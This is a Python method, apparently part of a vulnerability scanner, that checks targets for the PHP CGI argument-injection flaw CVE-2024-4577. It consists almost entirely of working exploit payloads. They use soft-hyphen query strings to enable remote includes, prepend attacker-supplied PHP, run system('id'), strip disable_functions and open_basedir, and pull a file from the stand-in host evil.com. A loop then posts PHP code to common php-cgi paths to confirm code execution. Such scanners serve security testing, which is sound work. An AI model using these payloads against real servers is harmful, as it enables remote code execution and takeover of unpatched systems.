    def test_cve_2024_4577_php_cgi_v2(self):
        """CVE-2024-4577 — PHP CGI Argument Injection (deeper)."""
        if not self.deep: return
        self._print("[*]", "Wave2: CVE-2024-4577 PHP CGI v2...", "INFO")
        # CVE-2024-4577 uses soft hyphen character to bypass
        # Soft hyphen is U+00AD (Unicode) or 0xAD in Latin-1
        payloads = [
            "%ADd+allow_url_include%3DOn+%ADd+auto_prepend_file%3Dphp://input",
            "%ADd+allow_url_include%3DOn+%ADd+auto_prepend_file%3Ddata://text/plain,<?php+system('id');+?>",
            "%ADd+allow_url_include%3DOn+%ADd+auto_prepend_file%3Dexpect://id",
            "%ADd+allow_url_include%3DOn+%ADd+auto_prepend_file%3Dhttp://evil.com/x.txt",
            "%ADd+disable_functions%3D+",
            "%ADd+open_basedir%3D+",
            "%ADd+auto_prepend_file%3D+",
            "%ADd+auto_append_file%3D+",
            "%ADd+display_errors%3DOn",
            "%ADd+error_log%3D/dev/null",
            "%ADd+log_errors%3DOn",
        ]
        for path in ["/php/php-cgi.exe", "/cgi-bin/php.exe",
                     "/php-cgi/php.exe", "/php-cgi.exe",
                     "/cgi-bin/php-cgi.exe"]:
            url = urljoin(self.target, path)
            for payload in payloads:
                full_url = url + "?" + payload
                try:
                    r = self._post(full_url, data=b"<?php echo 'PWNED'; ?>",
                                    headers={"Content-Type": "application/x-www-form-urlencoded"})
                    if not r: continue
                    if "PWNED" in (r.text or ""):
                        self._add_vuln(f"CVE-2024-4577 PHP CGI RCE: {path}",
                                        "CRITICAL", url,
                                        f"PHP CGI argument injection confirmed",
                                        cve="CVE-2024-4577", path=path)
                except Exception: pass

